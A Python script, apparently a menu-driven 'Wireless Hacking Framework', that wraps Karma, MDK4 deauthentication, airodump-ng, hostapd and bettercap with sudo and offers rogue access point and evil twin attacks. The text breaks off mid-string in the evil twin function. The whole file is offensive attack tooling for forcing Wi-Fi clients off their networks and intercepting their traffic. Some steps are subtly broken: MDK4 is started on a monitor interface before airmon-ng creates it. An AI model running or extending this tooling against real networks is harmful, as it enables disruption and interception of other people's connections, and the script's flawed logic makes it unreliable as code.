import os
import sys
import subprocess
import time

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def run_command(cmd):
    os.system(cmd)

def display_menu():
    clear_screen()
    print("Wireless Hacking Framework")
    print("==========================")
    print("1. Start Karma")
    print("2. Stop Karma")
    print("3. Start MDK4")
    print("4. Stop MDK4")
    print("5. Start Airmon-ng")
    print("6. Stop Airmon-ng")
    print("7. Start Airodump-ng")
    print("8. Stop Airodump-ng")
    print("9. Start Hostapd")
    print("10. Stop Hostapd")
    print("11. Start Bettercap")
    print("12. Stop Bettercap")
    print("13. Run Pre-Configured Set of Tools")
    print("14. Simulate Rogue Access Point Attack")
    print("15. Perform Evil Twin Attack")
    print("0. Exit")

def get_user_choice():
    while True:
        try:
            choice = int(input("Enter your choice (0-15): "))
            if choice in range(16):
                return choice
        except ValueError:
            pass
        print("Invalid choice. Please try again.")

def wait_for_user():
    print()
    input("Press Enter to continue...")

def start_karma():
    run_command("sudo karma start")
    print("Karma started successfully!")

def stop_karma():
    run_command("sudo karma stop")
    print("Karma stopped successfully!")

def start_mdk4():
    run_command("sudo mdk4 wlan0mon d")
    print("MDK4 started successfully!")

def stop_mdk4():
    run_command("sudo killall mdk4")
    print("MDK4 stopped successfully!")

def start_airmon_ng():
    run_command("sudo airmon-ng start wlan0")
    print("Airmon-ng started successfully!")

def stop_airmon_ng():
    run_command("sudo airmon-ng stop wlan0mon")
    print("Airmon-ng stopped successfully!")

def start_airodump_ng():
    subprocess.Popen(["sudo", "airodump-ng", "wlan0mon"])

def stop_airodump_ng():
    run_command("sudo killall airodump-ng")
    print("Airodump-ng stopped successfully!")

def start_hostapd():
    run_command("sudo hostapd /etc/hostapd/hostapd.conf")
    print("Hostapd started successfully!")

def stop_hostapd():
    run_command("sudo killall hostapd")
    print("Hostapd stopped successfully!")

def start_bettercap():
    subprocess.Popen(["sudo", "bettercap", "-iface", "wlan0mon"])

def stop_bettercap():
    run_command("sudo killall bettercap")
    print("Bettercap stopped successfully!")

def run_tools():
    start_karma()
    start_mdk4()
    start_airmon_ng()
    start_airodump_ng()
    start_hostapd()
    start_bettercap()

def stop_tools():
    stop_bettercap()
    stop_hostapd()
    stop_airodump_ng()
    stop_airmon_ng()
    stop_mdk4()
    stop_karma()

def simulate_rogue_ap_attack():
    print("Starting Rogue AP attack...")
    run_tools()
    wait_for_user()
    stop_tools()

def perform_evil_twin_attack():
    print("Starting